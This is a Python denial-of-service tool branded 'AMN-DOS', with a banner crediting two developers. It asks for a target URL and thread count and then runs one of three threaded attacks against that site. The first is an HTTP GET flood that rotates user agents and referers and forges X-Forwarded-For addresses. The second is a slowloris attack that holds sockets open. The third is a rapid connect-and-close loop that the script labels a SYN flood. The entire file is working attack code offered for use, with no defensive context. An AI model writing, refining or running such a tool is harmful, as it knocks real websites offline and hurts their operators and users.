#!/usr/bin/env python3

import threading
import socket
import random
import time
import requests
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

# ========== SETTINGS ==========
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
]
referers = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.facebook.com",
    "https://www.twitter.com"
]

banner = f"""
{Fore.RED}
	█████╗ ███╗   ███╗███╗   ██╗     
	██╔══██╗████╗ ████║████╗  ██║   ██████  ██████ ██████
	███████║██╔████╔██║██╔██╗ ██║      
	██╔══██║██║╚██╔╝██║██║╚██╗██║     ██║   ██║██║   ║██  
	██║  ██║██║ ╚═╝ ██║██║ ╚████║    
	╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═══╝      ╚═════╝  ╚═════╝ 
          AMN-DOS :: Advance Multi-layer Attack Tool
             	   
           Developed by: Ali Moavia && Mehwish Naz
          +=======================================+
"""

def send_http_flood(url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Referer": random.choice(referers),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
            }
            response = requests.get(url, headers=headers, timeout=5)
            print(f"{Fore.GREEN}[+] HTTP Flood Sent | Status: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"{Fore.YELLOW}[!] Request Failed")


def send_slowloris(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(f"GET /?{random.randint(0,1000)} HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {host}\r\n".encode("utf-8"))
        while True:
            s.send(f"X-a: {random.randint(1,5000)}\r\n".encode("utf-8"))
            time.sleep(15)
    except:
        print(f"{Fore.YELLOW}[!] Slowloris Socket Dropped")


def send_tcp_syn_flood(target_ip, target_port):
    try:
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.01)
            s.connect((target_ip, target_port))
            s.send(b"\x00\x02")
            s.close()
            print(f"{Fore.CYAN}[+] TCP SYN Packet Sent")
    except:
        pass


# ================== START ATTACK ==================
def main():
    print(banner)
    target_url = input("Enter Target URL (e.g., https://example.com): ").strip()
    attack_type = input("Attack Mode [http/slowloris/tcp]: ").strip().lower()
    threads = int(input("Number of Threads: "))

    if attack_type == "http":
        for _ in range(threads):
            threading.Thread(target=send_http_flood, args=(target_url,)).start()

    elif attack_type == "slowloris":
        host = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        for _ in range(threads):
            threading.Thread(target=send_slowloris, args=(host, 80)).start()

    elif attack_type == "tcp":
        host = target_url.replace("https://", "").replace("http://", "").split("/")[0]
        try:
            ip = socket.gethostbyname(host)
            for _ in range(threads):
                threading.Thread(target=send_tcp_syn_flood, args=(ip, 80)).start()
        except:
            print(f"{Fore.RED}[-] Could not resolve host!")
            sys.exit(1)
    else:
        print(f"{Fore.RED}[-] Unknown attack type!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Attack stopped by user.")
